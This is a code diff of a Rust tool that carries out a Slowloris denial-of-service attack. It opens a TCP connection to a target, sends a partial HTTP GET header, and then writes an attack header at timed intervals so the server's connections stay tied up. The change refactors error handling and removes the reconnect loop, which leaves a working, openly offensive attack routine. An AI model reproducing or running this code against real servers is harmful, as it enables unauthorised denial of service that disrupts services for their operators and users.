@@ -68,30 +68,15 @@ fn construct_header(args :&Arguments) -> String {
     format!("GET {} HTTP/1.1\r\nHost: {}\r\n{}", "/", args.arg_target.as_str(), "")
 }
 
-macro_rules! ok_or_break {
-    ($e:expr) => (match $e {
-        Ok(val) => val,
-        Err(_) => break,
-    });
-}
+fn slowloris(opts :AttackOptions) -> Result<(), Box<Error>> {
+    let mut stream = try!(net::TcpStream::connect(opts.target));
 
-macro_rules! ok_or_continue {
-    ($e:expr) => (match $e {
-        Ok(val) => val,
-        Err(_) => continue,
-    });
-}
+    try!(stream.write_all(opts.header.as_str().as_bytes()));
 
-fn slowloris(opts :AttackOptions) -> ! {
+    let hdr = format!("{}\r\n", opts.attack_header.as_str());
     loop {
-        let mut stream = ok_or_continue!(net::TcpStream::connect(opts.target));
-        ok_or_continue!(stream.write_all(opts.header.as_str().as_bytes()));
-
-        loop {
-            let hdr = format!("{}\r\n", opts.attack_header.as_str());
-            ok_or_break!(stream.write_all(hdr.as_bytes()));
-            sleep(opts.interval.to_std().unwrap());
-        }
+        try!(stream.write_all(hdr.as_bytes()));
+        sleep(opts.interval.to_std().unwrap());
     }
 }
 
